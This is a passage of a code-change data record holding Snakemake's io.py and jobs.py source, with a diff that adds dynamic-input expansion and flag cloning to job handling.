max_len(int): The maximum length of the periodic substring. \"\"\" self.regex=re.compile( \"((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$\".format( min_repeat=min_repeat -1, max_repeat=max_repeat -1)) def is_periodic(self, value): \"\"\"Returns the periodic substring or None if not periodic.\"\"\" m=self.regex.search(value) if m is not None: return m.group(\"value\") ", "sourceWithComments": "__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport re\nimport stat\nimport time\nimport json\nfrom itertools import product, chain\nfrom collections import Iterable, namedtuple\nfrom snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\nfrom snakemake.logging import logger\n\n\ndef lstat(f):\n    return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n\n\ndef lutime(f, times):\n    return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks)\n\n\ndef lchmod(f, mode):\n    return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks)\n\n\ndef IOFile(file, rule=None):\n    f = _IOFile(file)\n    f.rule = rule\n    return f\n\n\nclass _IOFile(str):\n    \"\"\"\n    A file that is either input or output of a rule.\n    \"\"\"\n\n    dynamic_fill = \"__snakemake_dynamic__\"\n\n    def __new__(cls, file):\n        obj = str.__new__(cls, file)\n        obj._is_function = type(file).__name__ == \"function\"\n        obj._file = file\n        obj.rule = None\n        obj._regex = None\n        return obj\n\n    @property\n    def file(self):\n        if not self._is_function:\n            return self._file\n        else:\n            raise ValueError(\"This IOFile is specified as a function and \"\n                             \"may not be used directly.\")\n\n    @property\n    def exists(self):\n        return os.path.exists(self.file)\n\n    @property\n    def protected(self):\n        return self.exists and not os.access(self.file, os.W_OK)\n\n    @property\n    def mtime(self):\n        # do not follow symlinks for modification time\n        return lstat(self.file).st_mtime\n\n    @property\n    def size(self):\n        # follow symlinks but throw error if invalid\n        self.check_broken_symlink()\n        return os.path.getsize(self.file)\n\n    def check_broken_symlink(self):\n        \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n        if not self.exists and lstat(self.file):\n            raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n\n    def is_newer(self, time):\n        return self.mtime > time\n\n    def prepare(self):\n        path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n        dir = os.path.dirname(path_until_wildcard)\n        if len(dir) > 0 and not os.path.exists(dir):\n            try:\n                os.makedirs(dir)\n            except OSError as e:\n                # ignore Errno 17 \"File exists\" (reason: multiprocessing)\n                if e.errno != 17:\n                    raise e\n\n    def protect(self):\n        mode = (lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~\n                stat.S_IWOTH)\n        if os.path.isdir(self.file):\n            for root, dirs, files in os.walk(self.file):\n                for d in dirs:\n                    lchmod(os.path.join(self.file, d), mode)\n                for f in files:\n                    lchmod(os.path.join(self.file, f), mode)\n        else:\n            lchmod(self.file, mode)\n\n    def remove(self):\n        remove(self.file)\n\n    def touch(self):\n        try:\n            lutime(self.file, None)\n        except OSError as e:\n            if e.errno == 2:\n                raise MissingOutputException(\n                    \"Output file {} of rule {} shall be touched but \"\n                    \"does not exist.\".format(self.file, self.rule.name),\n                    lineno=self.rule.lineno,\n                    snakefile=self.rule.snakefile)\n            else:\n                raise e\n\n    def touch_or_create(self):\n        try:\n            self.touch()\n        except MissingOutputException:\n            # create empty file\n            with open(self.file, \"w\") as f:\n                pass\n\n    def apply_wildcards(self, wildcards,\n                        fill_missing=False,\n                        fail_dynamic=False):\n        f = self._file\n        if self._is_function:\n            f = self._file(Namedlist(fromdict=wildcards))\n\n        return IOFile(apply_wildcards(f, wildcards,\n                                      fill_missing=fill_missing,\n                                      fail_dynamic=fail_dynamic,\n                                      dynamic_fill=self.dynamic_fill),\n                      rule=self.rule)\n\n    def get_wildcard_names(self):\n        return get_wildcard_names(self.file)\n\n    def contains_wildcard(self):\n        return contains_wildcard(self.file)\n\n    def regex(self):\n        if self._regex is None:\n            # compile a regular expression\n            self._regex = re.compile(regex(self.file))\n        return self._regex\n\n    def constant_prefix(self):\n        first_wildcard = _wildcard_regex.search(self.file)\n        if first_wildcard:\n            return self.file[:first_wildcard.start()]\n        return self.file\n\n    def match(self, target):\n        return self.regex().match(target) or None\n\n    def format_dynamic(self):\n        return self.replace(self.dynamic_fill, \"{*}\")\n\n    def __eq__(self, other):\n        f = other._file if isinstance(other, _IOFile) else other\n        return self._file == f\n\n    def __hash__(self):\n        return self._file.__hash__()\n\n\n_wildcard_regex = re.compile(\n    \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>([^\\{\\}]+|\\{\\d+(,\\d+)?\\})*))?\\s*\\}\")\n\n#    \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>[^\\}]*))?\\s*\\}\")\n\n\ndef wait_for_files(files, latency_wait=3):\n    \"\"\"Wait for given files to be present in filesystem.\"\"\"\n    files = list(files)\n    get_missing = lambda: [f for f in files if not os.path.exists(f)]\n    missing = get_missing()\n    if missing:\n        logger.info(\"Waiting at most {} seconds for missing files.\".format(\n            latency_wait))\n        for _ in range(latency_wait):\n            if not get_missing():\n                return\n            time.sleep(1)\n        raise IOError(\"Missing files after {} seconds:\\n{}\".format(\n            latency_wait, \"\\n\".join(get_missing())))\n\n\ndef get_wildcard_names(pattern):\n    return set(match.group('name')\n               for match in _wildcard_regex.finditer(pattern))\n\n\ndef contains_wildcard(path):\n    return _wildcard_regex.search(path) is not None\n\n\ndef remove(file):\n    if os.path.exists(file):\n        if os.path.isdir(file):\n            try:\n                os.removedirs(file)\n            except OSError:\n                # ignore non empty directories\n                pass\n        else:\n            os.remove(file)\n\n\ndef regex(filepattern):\n    f = []\n    last = 0\n    wildcards = set()\n    for match in _wildcard_regex.finditer(filepattern):\n        f.append(re.escape(filepattern[last:match.start()]))\n        wildcard = match.group(\"name\")\n        if wildcard in wildcards:\n            if match.group(\"constraint\"):\n                raise ValueError(\n                    \"If multiple wildcards of the same name \"\n                    \"appear in a string, eventual constraints have to be defined \"\n                    \"at the first occurence and will be inherited by the others.\")\n            f.append(\"(?P={})\".format(wildcard))\n        else:\n            wildcards.add(wildcard)\n            f.append(\"(?P<{}>{})\".format(wildcard, match.group(\"constraint\") if\n                                         match.group(\"constraint\") else \".+\"))\n        last = match.end()\n    f.append(re.escape(filepattern[last:]))\n    f.append(\"$\")  # ensure that the match spans the whole file\n    return \"\".join(f)\n\n\ndef apply_wildcards(pattern, wildcards,\n                    fill_missing=False,\n                    fail_dynamic=False,\n                    dynamic_fill=None,\n                    keep_dynamic=False):\n    def format_match(match):\n        name = match.group(\"name\")\n        try:\n            value = wildcards[name]\n            if fail_dynamic and value == dynamic_fill:\n                raise WildcardError(name)\n            return str(value)  # convert anything into a str\n        except KeyError as ex:\n            if keep_dynamic:\n                return \"{{{}}}\".format(name)\n            elif fill_missing:\n                return dynamic_fill\n            else:\n                raise WildcardError(str(ex))\n\n    return re.sub(_wildcard_regex, format_match, pattern)\n\n\ndef not_iterable(value):\n    return isinstance(value, str) or not isinstance(value, Iterable)\n\n\nclass AnnotatedString(str):\n    def __init__(self, value):\n        self.flags = dict()\n\n\ndef flag(value, flag_type, flag_value=True):\n    if isinstance(value, AnnotatedString):\n        value.flags[flag_type] = flag_value\n        return value\n    if not_iterable(value):\n        value = AnnotatedString(value)\n        value.flags[flag_type] = flag_value\n        return value\n    return [flag(v, flag_type, flag_value=flag_value) for v in value]\n\n\ndef is_flagged(value, flag):\n    if isinstance(value, AnnotatedString):\n        return flag in value.flags\n    return False\n\n\ndef temp(value):\n    \"\"\"\n    A flag for an input or output file that shall be removed after usage.\n    \"\"\"\n    if is_flagged(value, \"protected\"):\n        raise SyntaxError(\n            \"Protected and temporary flags are mutually exclusive.\")\n    return flag(value, \"temp\")\n\n\ndef temporary(value):\n    \"\"\" An alias for temp. \"\"\"\n    return temp(value)\n\n\ndef protected(value):\n    \"\"\" A flag for a file that shall be write protected after creation. \"\"\"\n    if is_flagged(value, \"temp\"):\n        raise SyntaxError(\n            \"Protected and temporary flags are mutually exclusive.\")\n    return flag(value, \"protected\")\n\n\ndef dynamic(value):\n    \"\"\"\n    A flag for a file that shall be dynamic, i.e. the multiplicity\n    (and wildcard values) will be expanded after a certain\n    rule has been run \"\"\"\n    annotated = flag(value, \"dynamic\")\n    tocheck = [annotated] if not_iterable(annotated) else annotated\n    for file in tocheck:\n        matches = list(_wildcard_regex.finditer(file))\n        #if len(matches) != 1:\n        #    raise SyntaxError(\"Dynamic files need exactly one wildcard.\")\n        for match in matches:\n            if match.group(\"constraint\"):\n                raise SyntaxError(\n                    \"The wildcards in dynamic files cannot be constrained.\")\n    return annotated\n\n\ndef touch(value):\n    return flag(value, \"touch\")\n\n\ndef expand(*args, **wildcards):\n    \"\"\"\n    Expand wildcards in given filepatterns.\n\n    Arguments\n    *args -- first arg: filepatterns as list or one single filepattern,\n        second arg (optional): a function to combine wildcard values\n        (itertools.product per default)\n    **wildcards -- the wildcards as keyword arguments\n        with their values as lists\n    \"\"\"\n    filepatterns = args[0]\n    if len(args) == 1:\n        combinator = product\n    elif len(args) == 2:\n        combinator = args[1]\n    if isinstance(filepatterns, str):\n        filepatterns = [filepatterns]\n\n    def flatten(wildcards):\n        for wildcard, values in wildcards.items():\n            if isinstance(values, str) or not isinstance(values, Iterable):\n                values = [values]\n            yield [(wildcard, value) for value in values]\n\n    try:\n        return [filepattern.format(**comb)\n                for comb in map(dict, combinator(*flatten(wildcards))) for\n                filepattern in filepatterns]\n    except KeyError as e:\n        raise WildcardError(\"No values given for wildcard {}.\".format(e))\n\n\ndef limit(pattern, **wildcards):\n    \"\"\"\n    Limit wildcards to the given values.\n\n    Arguments:\n    **wildcards -- the wildcards as keyword arguments\n                   with their values as lists\n    \"\"\"\n    return pattern.format(**{\n        wildcard: \"{{{},{}}}\".format(wildcard, \"|\".join(values))\n        for wildcard, values in wildcards.items()\n    })\n\n\ndef glob_wildcards(pattern):\n    \"\"\"\n    Glob the values of the wildcards by matching the given pattern to the filesystem.\n    Returns a named tuple with a list of values for each wildcard.\n    \"\"\"\n    pattern = os.path.normpath(pattern)\n    first_wildcard = re.search(\"{[^{]\", pattern)\n    dirname = os.path.dirname(pattern[:first_wildcard.start(\n    )]) if first_wildcard else os.path.dirname(pattern)\n    if not dirname:\n        dirname = \".\"\n\n    names = [match.group('name')\n             for match in _wildcard_regex.finditer(pattern)]\n    Wildcards = namedtuple(\"Wildcards\", names)\n    wildcards = Wildcards(*[list() for name in names])\n\n    pattern = re.compile(regex(pattern))\n    for dirpath, dirnames, filenames in os.walk(dirname):\n        for f in chain(filenames, dirnames):\n            if dirpath != \".\":\n                f = os.path.join(dirpath, f)\n            match = re.match(pattern, f)\n            if match:\n                for name, value in match.groupdict().items():\n                    getattr(wildcards, name).append(value)\n    return wildcards\n\n\n# TODO rewrite Namedlist!\nclass Namedlist(list):\n    \"\"\"\n    A list that additionally provides functions to name items. Further,\n    it is hashable, however the hash does not consider the item names.\n    \"\"\"\n\n    def __init__(self, toclone=None, fromdict=None, plainstr=False):\n        \"\"\"\n        Create the object.\n\n        Arguments\n        toclone  -- another Namedlist that shall be cloned\n        fromdict -- a dict that shall be converted to a\n            Namedlist (keys become names)\n        \"\"\"\n        list.__init__(self)\n        self._names = dict()\n\n        if toclone:\n            self.extend(map(str, toclone) if plainstr else toclone)\n            if isinstance(toclone, Namedlist):\n                self.take_names(toclone.get_names())\n        if fromdict:\n            for key, item in fromdict.items():\n                self.append(item)\n                self.add_name(key)\n\n    def add_name(self, name):\n        \"\"\"\n        Add a name to the last item.\n\n        Arguments\n        name -- a name\n        \"\"\"\n        self.set_name(name, len(self) - 1)\n\n    def set_name(self, name, index, end=None):\n        \"\"\"\n        Set the name of an item.\n\n        Arguments\n        name  -- a name\n        index -- the item index\n        \"\"\"\n        self._names[name] = (index, end)\n        if end is None:\n            setattr(self, name, self[index])\n        else:\n            setattr(self, name, Namedlist(toclone=self[index:end]))\n\n    def get_names(self):\n        \"\"\"\n        Get the defined names as (name, index) pairs.\n        \"\"\"\n        for name, index in self._names.items():\n            yield name, index\n\n    def take_names(self, names):\n        \"\"\"\n        Take over the given names.\n\n        Arguments\n        names -- the given names as (name, index) pairs\n        \"\"\"\n        for name, (i, j) in names:\n            self.set_name(name, i, end=j)\n\n    def items(self):\n        for name in self._names:\n            yield name, getattr(self, name)\n\n    def allitems(self):\n        next = 0\n        for name, index in sorted(self._names.items(),\n                                  key=lambda item: item[1][0]):\n            start, end = index\n            if end is None:\n                end = start + 1\n            if start > next:\n                for item in self[next:start]:\n                    yield None, item\n            yield name, getattr(self, name)\n            next = end\n        for item in self[next:]:\n            yield None, item\n\n    def insert_items(self, index, items):\n        self[index:index + 1] = items\n        add = len(items) - 1\n        for name, (i, j) in self._names.items():\n            if i > index:\n                self._names[name] = (i + add, j + add)\n            elif i == index:\n                self.set_name(name, i, end=i + len(items))\n\n    def keys(self):\n        return self._names\n\n    def plainstrings(self):\n        return self.__class__.__call__(toclone=self, plainstr=True)\n\n    def __getitem__(self, key):\n        try:\n            return super().__getitem__(key)\n        except TypeError:\n            pass\n        return getattr(self, key)\n\n    def __hash__(self):\n        return hash(tuple(self))\n\n    def __str__(self):\n        return \" \".join(map(str, self))\n\n\nclass InputFiles(Namedlist):\n    pass\n\n\nclass OutputFiles(Namedlist):\n    pass\n\n\nclass Wildcards(Namedlist):\n    pass\n\n\nclass Params(Namedlist):\n    pass\n\n\nclass Resources(Namedlist):\n    pass\n\n\nclass Log(Namedlist):\n    pass\n\n\ndef _load_configfile(configpath):\n    \"Tries to load a configfile first as JSON, then as YAML, into a dict.\"\n    try:\n        with open(configpath) as f:\n            try:\n                return json.load(f)\n            except ValueError:\n                f.seek(0)  # try again\n            try:\n                import yaml\n            except ImportError:\n                raise WorkflowError(\"Config file is not valid JSON and PyYAML \"\n                                    \"has not been installed. Please install \"\n                                    \"PyYAML to use YAML config files.\")\n            try:\n                return yaml.load(f)\n            except yaml.YAMLError:\n                raise WorkflowError(\"Config file is not valid JSON or YAML.\")\n    except FileNotFoundError:\n        raise WorkflowError(\"Config file {} not found.\".format(configpath))\n\n\ndef load_configfile(configpath):\n    \"Loads a JSON or YAML configfile as a dict, then checks that it's a dict.\"\n    config = _load_configfile(configpath)\n    if not isinstance(config, dict):\n        raise WorkflowError(\"Config file must be given as JSON or YAML \"\n                            \"with keys at top level.\")\n    return config\n\n##### Wildcard pumping detection #####\n\n\nclass PeriodicityDetector:\n    def __init__(self, min_repeat=50, max_repeat=100):\n        \"\"\"\n        Args:\n            max_len (int): The maximum length of the periodic substring.\n        \"\"\"\n        self.regex = re.compile(\n            \"((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$\".format(\n                min_repeat=min_repeat - 1,\n                max_repeat=max_repeat - 1))\n\n    def is_periodic(self, value):\n        \"\"\"Returns the periodic substring or None if not periodic.\"\"\"\n        m = self.regex.search(value)  # search for a periodic suffix.\n        if m is not None:\n            return m.group(\"value\")\n"}, "/snakemake/jobs.py": {"changes": [{"diff": "\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n", "add": 1, "remove": 1, "filename": "/snakemake/jobs.py", "badparts": ["from snakemake.io import IOFile, Wildcards, Resources, _IOFile"], "goodparts": ["from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard"]}, {"diff": "\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", \"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n", "add": 34, "remove": 1, "filename": "/snakemake/jobs.py", "badparts": ["                    yield IOFile(f, self.rule)"], "goodparts": ["                    fileToYield = IOFile(f, self.rule)", "                    fileToYield.clone_flags(f_)", "                    yield fileToYield", "            else:", "                yield f", "    @property", "    def expanded_input(self):", "        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"", "        for f, f_ in zip(self.input, self.rule.input):", "            if not type(f_).__name__ == \"function\":", "                if type(f_.file).__name__ not in [\"str\", \"function\"]:", "                    if contains_wildcard(f_):", "                        expansion = self.expand_dynamic(", "                            f_,", "                            restriction=self.wildcards,", "                            omit_value=_IOFile.dynamic_fill)", "                        if not expansion:", "                            yield f_", "                        for f, _ in expansion:", "                            fileToYield = IOFile(f, self.rule)", "                            fileToYield.clone_flags(f_)", "                            yield fileToYield", "                    else:", "                        yield f", "                else:", "                    yield f"]}], "source": "\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import sys import base64 import json from collections import defaultdict from itertools import chain from functools import partial from operator import attrgetter from snakemake.io import IOFile, Wildcards, Resources, _IOFile from snakemake.utils import format, listfiles from snakemake.exceptions import RuleException, ProtectedOutputException from snakemake.exceptions import UnexpectedOutputException from snakemake.logging import logger def jobfiles(jobs, type): return chain(*map(attrgetter(type), jobs)) class Job: HIGHEST_PRIORITY=sys.maxsize def __init__(self, rule, dag, targetfile=None, format_wildcards=None): self.rule=rule self.dag=dag self.targetfile=targetfile self.wildcards_dict=self.rule.get_wildcards(targetfile) self.wildcards=Wildcards(fromdict=self.wildcards_dict) self._format_wildcards=(self.wildcards if format_wildcards is None else Wildcards(fromdict=format_wildcards)) (self.input, self.output, self.params, self.log, self.benchmark, self.ruleio, self.dependencies)=rule.expand_wildcards(self.wildcards_dict) self.resources_dict={ name: min(self.rule.workflow.global_resources.get(name, res), res) for name, res in rule.resources.items() } self.threads=self.resources_dict[\"_cores\"] self.resources=Resources(fromdict=self.resources_dict) self._inputsize=None self.dynamic_output, self.dynamic_input=set(), set() self.temp_output, self.protected_output=set(), set() self.touch_output=set() self.subworkflow_input=dict() for f in self.output: f_=self.ruleio[f] if f_ in self.rule.dynamic_output: self.dynamic_output.add(f) if f_ in self.rule.temp_output: self.temp_output.add(f) if f_ in self.rule.protected_output: self.protected_output.add(f) if f_ in self.rule.touch_output: self.touch_output.add(f) for f in self.input: f_=self.ruleio[f] if f_ in self.rule.dynamic_input: self.dynamic_input.add(f) if f_ in self.rule.subworkflow_input: self.subworkflow_input[f]=self.rule.subworkflow_input[f_] self._hash=self.rule.__hash__() if True or not self.dynamic_output: for o in self.output: self._hash ^=o.__hash__() @property def priority(self): return self.dag.priority(self) @property def b64id(self): return base64.b64encode((self.rule.name +\"\".join(self.output) ).encode(\"utf-8\")).decode(\"utf-8\") @property def inputsize(self): \"\"\" Return the size of the input files. Input files need to be present. \"\"\" if self._inputsize is None: self._inputsize=sum(f.size for f in self.input) return self._inputsize @property def message(self): \"\"\" Return the message for this job. \"\"\" try: return(self.format_wildcards(self.rule.message) if self.rule.message else None) except AttributeError as ex: raise RuleException(str(ex), rule=self.rule) except KeyError as ex: raise RuleException(\"Unknown variable in message \" \"of shell command:{}\".format(str(ex)), rule=self.rule) @property def shellcmd(self): \"\"\" Return the shell command. \"\"\" try: return(self.format_wildcards(self.rule.shellcmd) if self.rule.shellcmd else None) except AttributeError as ex: raise RuleException(str(ex), rule=self.rule) except KeyError as ex: raise RuleException(\"Unknown variable when printing \" \"shell command:{}\".format(str(ex)), rule=self.rule) @property def expanded_output(self): \"\"\" Iterate over output files while dynamic output is expanded. \"\"\" for f, f_ in zip(self.output, self.rule.output): if f in self.dynamic_output: expansion=self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill) if not expansion: yield f_ for f, _ in expansion: yield IOFile(f, self.rule) else: yield f @property def dynamic_wildcards(self): \"\"\" Return all wildcard values determined from dynamic output. \"\"\" combinations=set() for f, f_ in zip(self.output, self.rule.output): if f in self.dynamic_output: for f, w in self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill): combinations.add(tuple(w.items())) wildcards=defaultdict(list) for combination in combinations: for name, value in combination: wildcards[name].append(value) return wildcards @property def missing_input(self): \"\"\" Return missing input files. \"\"\" return set(f for f in self.input if not f.exists and not f in self.subworkflow_input) @property def output_mintime(self): \"\"\" Return oldest output file. \"\"\" existing=[f.mtime for f in self.expanded_output if f.exists] if self.benchmark and self.benchmark.exists: existing.append(self.benchmark.mtime) if existing: return min(existing) return None @property def input_maxtime(self): \"\"\" Return newest input file. \"\"\" existing=[f.mtime for f in self.input if f.exists] if existing: return max(existing) return None def missing_output(self, requested=None): \"\"\" Return missing output files. \"\"\" files=set() if self.benchmark and(requested is None or self.benchmark in requested): if not self.benchmark.exists: files.add(self.benchmark) for f, f_ in zip(self.output, self.rule.output): if requested is None or f in requested: if f in self.dynamic_output: if not self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill): files.add(\"{}(dynamic)\".format(f_)) elif not f.exists: files.add(f) return files @property def existing_output(self): return filter(lambda f: f.exists, self.expanded_output) def check_protected_output(self): protected=list(filter(lambda f: f.protected, self.expanded_output)) if protected: raise ProtectedOutputException(self.rule, protected) def prepare(self): \"\"\" Prepare execution of job. This includes creation of directories and deletion of previously created dynamic files. \"\"\" self.check_protected_output() unexpected_output=self.dag.reason(self).missing_output.intersection( self.existing_output) if unexpected_output: logger.warning( \"Warning: the following output files of rule{} were not \" \"present when the DAG was created:\\n{}\".format( self.rule, unexpected_output)) if self.dynamic_output: for f, _ in chain(*map(partial(self.expand_dynamic, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill), self.rule.dynamic_output)): os.remove(f) for f, f_ in zip(self.output, self.rule.output): f.prepare() for f in self.log: f.prepare() if self.benchmark: self.benchmark.prepare() def cleanup(self): \"\"\" Cleanup output files. \"\"\" to_remove=[f for f in self.expanded_output if f.exists] if to_remove: logger.info(\"Removing output files of failed job{}\" \" since they might be corrupted:\\n{}\".format( self, \", \".join(to_remove))) for f in to_remove: f.remove() def format_wildcards(self, string, **variables): \"\"\" Format a string with variables from the job. \"\"\" _variables=dict() _variables.update(self.rule.workflow.globals) _variables.update(dict(input=self.input, output=self.output, params=self.params, wildcards=self._format_wildcards, threads=self.threads, resources=self.resources, log=self.log, version=self.rule.version, rule=self.rule.name,)) _variables.update(variables) try: return format(string, **_variables) except NameError as ex: raise RuleException(\"NameError: \" +str(ex), rule=self.rule) except IndexError as ex: raise RuleException(\"IndexError: \" +str(ex), rule=self.rule) def properties(self, omit_resources=\"_cores _nodes\".split()): resources={ name: res for name, res in self.resources.items() if name not in omit_resources } params={name: value for name, value in self.params.items()} properties={ \"rule\": self.rule.name, \"local\": self.dag.workflow.is_local(self.rule), \"input\": self.input, \"output\": self.output, \"params\": params, \"threads\": self.threads, \"resources\": resources } return properties def json(self): return json.dumps(self.properties()) def __repr__(self): return self.rule.name def __eq__(self, other): if other is None: return False return self.rule==other.rule and( self.dynamic_output or self.wildcards_dict==other.wildcards_dict) def __lt__(self, other): return self.rule.__lt__(other.rule) def __gt__(self, other): return self.rule.__gt__(other.rule) def __hash__(self): return self._hash @staticmethod def expand_dynamic(pattern, restriction=None, omit_value=None): \"\"\" Expand dynamic files. \"\"\" return list(listfiles(pattern, restriction=restriction, omit_value=omit_value)) class Reason: def __init__(self): self.updated_input=set() self.updated_input_run=set() self.missing_output=set() self.incomplete_output=set() self.forced=False self.noio=False self.nooutput=False self.derived=True def __str__(self): s=list() if self.forced: s.append(\"Forced execution\") else: if self.noio: s.append(\"Rules with neither input nor \" \"output files are always executed.\") elif self.nooutput: s.append(\"Rules with a run or shell declaration but no output \" \"are always executed.\") else: if self.missing_output: s.append(\"Missing output files:{}\".format( \", \".join(self.missing_output))) if self.incomplete_output: s.append(\"Incomplete output files:{}\".format( \", \".join(self.incomplete_output))) updated_input=self.updated_input -self.updated_input_run if updated_input: s.append(\"Updated input files:{}\".format( \", \".join(updated_input))) if self.updated_input_run: s.append(\"Input files updated by another job:{}\".format( \", \".join(self.updated_input_run))) s=\"; \".join(s) return s def __bool__(self): return bool(self.updated_input or self.missing_output or self.forced or self.updated_input_run or self.noio or self.nooutput) ", "sourceWithComments": "__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport sys\nimport base64\nimport json\n\nfrom collections import defaultdict\nfrom itertools import chain\nfrom functools import partial\nfrom operator import attrgetter\n\nfrom snakemake.io import IOFile, Wildcards, Resources, _IOFile\nfrom snakemake.utils import format, listfiles\nfrom snakemake.exceptions import RuleException, ProtectedOutputException\nfrom snakemake.exceptions import UnexpectedOutputException\nfrom snakemake.logging import logger\n\n\ndef jobfiles(jobs, type):\n    return chain(*map(attrgetter(type), jobs))\n\n\nclass Job:\n    HIGHEST_PRIORITY = sys.maxsize\n\n    def __init__(self, rule, dag, targetfile=None, format_wildcards=None):\n        self.rule = rule\n        self.dag = dag\n        self.targetfile = targetfile\n\n        self.wildcards_dict = self.rule.get_wildcards(targetfile)\n        self.wildcards = Wildcards(fromdict=self.wildcards_dict)\n        self._format_wildcards = (self.wildcards if format_wildcards is None\n                                  else Wildcards(fromdict=format_wildcards))\n\n        (self.input, self.output, self.params, self.log, self.benchmark,\n         self.ruleio,\n         self.dependencies) = rule.expand_wildcards(self.wildcards_dict)\n\n        self.resources_dict = {\n            name: min(self.rule.workflow.global_resources.get(name, res), res)\n            for name, res in rule.resources.items()\n        }\n        self.threads = self.resources_dict[\"_cores\"]\n        self.resources = Resources(fromdict=self.resources_dict)\n        self._inputsize = None\n\n        self.dynamic_output, self.dynamic_input = set(), set()\n        self.temp_output, self.protected_output = set(), set()\n        self.touch_output = set()\n        self.subworkflow_input = dict()\n        for f in self.output:\n            f_ = self.ruleio[f]\n            if f_ in self.rule.dynamic_output:\n                self.dynamic_output.add(f)\n            if f_ in self.rule.temp_output:\n                self.temp_output.add(f)\n            if f_ in self.rule.protected_output:\n                self.protected_output.add(f)\n            if f_ in self.rule.touch_output:\n                self.touch_output.add(f)\n        for f in self.input:\n            f_ = self.ruleio[f]\n            if f_ in self.rule.dynamic_input:\n                self.dynamic_input.add(f)\n            if f_ in self.rule.subworkflow_input:\n                self.subworkflow_input[f] = self.rule.subworkflow_input[f_]\n        self._hash = self.rule.__hash__()\n        if True or not self.dynamic_output:\n            for o in self.output:\n                self._hash ^= o.__hash__()\n\n    @property\n    def priority(self):\n        return self.dag.priority(self)\n\n    @property\n    def b64id(self):\n        return base64.b64encode((self.rule.name + \"\".join(self.output)\n                                 ).encode(\"utf-8\")).decode(\"utf-8\")\n\n    @property\n    def inputsize(self):\n        \"\"\"\n        Return the size of the input files.\n        Input files need to be present.\n        \"\"\"\n        if self._inputsize is None:\n            self._inputsize = sum(f.size for f in self.input)\n        return self._inputsize\n\n    @property\n    def message(self):\n        \"\"\" Return the message for this job. \"\"\"\n        try:\n            return (self.format_wildcards(self.rule.message) if\n                    self.rule.message else None)\n        except AttributeError as ex:\n            raise RuleException(str(ex), rule=self.rule)\n        except KeyError as ex:\n            raise RuleException(\"Unknown variable in message \"\n                                \"of shell command: {}\".format(str(ex)),\n                                rule=self.rule)\n\n    @property\n    def shellcmd(self):\n        \"\"\" Return the shell command. \"\"\"\n        try:\n            return (self.format_wildcards(self.rule.shellcmd) if\n                    self.rule.shellcmd else None)\n        except AttributeError as ex:\n            raise RuleException(str(ex), rule=self.rule)\n        except KeyError as ex:\n            raise RuleException(\"Unknown variable when printing \"\n                                \"shell command: {}\".format(str(ex)),\n                                rule=self.rule)\n\n    @property\n    def expanded_output(self):\n        \"\"\" Iterate over output files while dynamic output is expanded. \"\"\"\n        for f, f_ in zip(self.output, self.rule.output):\n            if f in self.dynamic_output:\n                expansion = self.expand_dynamic(\n                    f_,\n                    restriction=self.wildcards,\n                    omit_value=_IOFile.dynamic_fill)\n                if not expansion:\n                    yield f_\n                for f, _ in expansion:\n                    yield IOFile(f, self.rule)\n            else:\n                yield f\n\n    @property\n    def dynamic_wildcards(self):\n        \"\"\" Return all wildcard values determined from dynamic output. \"\"\"\n        combinations = set()\n        for f, f_ in zip(self.output, self.rule.output):\n            if f in self.dynamic_output:\n                for f, w in self.expand_dynamic(\n                    f_,\n                    restriction=self.wildcards,\n                    omit_value=_IOFile.dynamic_fill):\n                    combinations.add(tuple(w.items()))\n        wildcards = defaultdict(list)\n        for combination in combinations:\n            for name, value in combination:\n                wildcards[name].append(value)\n        return wildcards\n\n    @property\n    def missing_input(self):\n        \"\"\" Return missing input files. \"\"\"\n        # omit file if it comes from a subworkflow\n        return set(f for f in self.input\n                   if not f.exists and not f in self.subworkflow_input)\n\n    